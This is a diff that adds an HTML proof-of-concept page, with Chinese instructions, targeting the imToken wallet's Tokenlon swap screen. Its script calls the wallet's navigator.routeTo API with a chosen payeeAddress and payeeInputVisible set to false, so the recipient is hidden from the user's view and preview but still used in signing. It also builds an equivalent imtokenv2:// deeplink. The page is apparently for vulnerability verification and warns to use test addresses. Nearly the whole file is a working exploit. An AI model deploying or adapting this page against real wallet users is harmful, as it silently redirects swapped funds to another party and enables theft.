@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Tokenlon hidden payee PoC</title>
+  <style>
+    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background: #f6f7f9; color: #171a1f; }
+    main { max-width: 760px; margin: 0 auto; padding: 20px; }
+    h1 { font-size: 22px; margin: 0 0 10px; }
+    p { line-height: 1.55; }
+    label { display: block; margin: 14px 0 6px; font-weight: 600; }
+    input { box-sizing: border-box; width: 100%; padding: 12px; border: 1px solid #cfd6df; border-radius: 8px; font-size: 15px; }
+    button { margin-top: 16px; width: 100%; padding: 14px; border: 0; border-radius: 8px; background: #1769ff; color: white; font-size: 16px; font-weight: 700; }
+    pre { overflow: auto; padding: 12px; background: #111827; color: #e5e7eb; border-radius: 8px; font-size: 12px; line-height: 1.45; }
+    .warn { padding: 12px; border-radius: 8px; background: #fff4d6; border: 1px solid #f0c45c; }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Tokenlon hidden payee PoC</h1>
+  <p class="warn">
+    只用测试地址、小金额验证。PoC 会打开 Tokenlon，把 payeeAddress 放进路由参数，同时让 payeeInputVisible=false。
+    预期现象：Tokenlon 页面不展示收款地址输入框，订单预览也不展示 receiver，但后续签名参数会使用这个 payeeAddress。
+  </p>
+
+  <label>隐藏收款地址 payeeAddress</label>
+  <input id="payee" value="0x000000000000000000000000000000000000dEaD" />
+
+  <label>卖出代币 makerSymbol</label>
+  <input id="maker" value="USDT" />
+
+  <label>买入代币 takerSymbol</label>
+  <input id="taker" value="ETH" />
+
+  <label>买入数量 takerTokenAmountUnit</label>
+  <input id="amount" value="0.0001" />
+
+  <button id="go">调用 navigator.routeTo 打开 Tokenlon</button>
+
+  <h2>Payload</h2>
+  <pre id="log"></pre>
+
+  <h2>Deeplink variant</h2>
+  <p>
+    Deeplink query 参数都是字符串；不要传 payeeInputVisible=false，否则会变成字符串 "false" 并展示收款地址输入框。
+    Deeplink 验证时只传 payeeAddress。
+  </p>
+  <pre id="deeplink"></pre>
+</main>
+
+<script>
+  const logEl = document.getElementById('log');
+  const deeplinkEl = document.getElementById('deeplink');
+
+  function buildPayload() {
+    return {
+      screen: 'Tokenlon',
+      passProps: {
+        makerSymbol: document.getElementById('maker').value.trim(),
+        takerSymbol: document.getElementById('taker').value.trim(),
+        takerTokenAmountUnit: document.getElementById('amount').value.trim(),
+        operateInputMode: 'taker',
+        payeeInputVisible: false,
+        payeeAddress: document.getElementById('payee').value.trim(),
+        source: 'hidden-payee-poc'
+      }
+    };
+  }
+
+  function printPayload() {
+    const payload = buildPayload();
+    logEl.textContent = JSON.stringify(payload, null, 2);
+    const params = new URLSearchParams({
+      makerSymbol: payload.passProps.makerSymbol,
+      takerSymbol: payload.passProps.takerSymbol,
+      takerTokenAmountUnit: payload.passProps.takerTokenAmountUnit,
+      operateInputMode: payload.passProps.operateInputMode,
+      payeeAddress: payload.passProps.payeeAddress,
+      source: 'hidden-payee-poc'
+    });
+    deeplinkEl.textContent = 'imtokenv2://navigate/Tokenlon?' + params.toString();
+  }
+
+  document.querySelectorAll('input').forEach((input) => {
+    input.addEventListener('input', printPayload);
+  });
+
+  document.getElementById('go').addEventListener('click', async () => {
+    const payload = buildPayload();
+    printPayload();
+    if (!window.imToken || !window.imToken.callAPI) {
+      alert('window.imToken.callAPI 不存在：请在钱包 DApp WebView 中打开本页。');
+      return;
+    }
+    try {
+      await window.imToken.callAPI('navigator.routeTo', payload);
+    } catch (err) {
+      logEl.textContent += '\n\nERROR:\n' + (err && (err.stack || err.message) || String(err));
+    }
+  });
+
+  printPayload();
+</script>
+</body>
+</html>
